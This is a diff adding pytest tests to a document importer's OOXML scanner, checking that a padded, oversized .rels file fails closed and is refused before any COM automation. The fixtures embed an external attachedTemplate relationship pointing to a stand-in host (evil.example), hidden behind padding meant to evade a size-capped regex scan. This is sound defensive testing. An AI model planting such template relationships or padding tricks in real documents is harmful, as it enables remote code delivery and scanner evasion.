@@ -216,6 +216,34 @@ def test_scan_fails_closed_on_entry_bomb(tmp_path, monkeypatch):
     assert scan_ooxml_external_targets(p) == conv.SCAN_UNREADABLE
 
 
+def test_scan_fails_closed_on_oversized_rels(tmp_path):
+    """A .rels padded past the 4 MB read cap (entry COUNT stays tiny, so the entry
+    cap doesn't fire) hides a malicious External attachedTemplate BEYOND the cap from
+    the regex → must fail CLOSED on the truncated read, not fail open."""
+    import universal_importer.converters as conv
+    pad = "A" * (conv._RELS_MAX_BYTES + 1024)  # push the malicious tag past the read cap
+    rels = ('<!-- ' + pad + ' -->'
+            '<Relationship Id="rId1" Type=".../attachedTemplate" '
+            'Target="https://evil.example/t.dotm" TargetMode="External"/>')
+    p = _docx_with_rels(tmp_path, rels)
+    assert scan_ooxml_external_targets(p) == conv.SCAN_UNREADABLE  # fail CLOSED
+
+
+def test_office_via_com_refuses_oversized_rels(tmp_path):
+    """The oversized-.rels case must be refused before any COM Dispatch."""
+    import universal_importer.converters as conv
+    pad = "A" * (conv._RELS_MAX_BYTES + 1024)
+    rels = ('<!-- ' + pad + ' -->'
+            '<Relationship Id="rId1" Type=".../attachedTemplate" '
+            'Target="https://evil.example/t.dotm" TargetMode="External"/>')
+    p = _docx_with_rels(tmp_path, rels)
+    ci, cu = _no_com()
+    with ci, cu, patch("win32com.client.Dispatch") as disp:
+        with pytest.raises(ValueError, match="externe Vorlage/Quelle"):
+            office_via_com(p, ".docx")
+    disp.assert_not_called()
+
+
 def test_office_via_com_refuses_external_template_before_any_com(tmp_path):
     p = _docx_with_rels(tmp_path,
         '<Relationship Id="rId1" Type=".../attachedTemplate" '
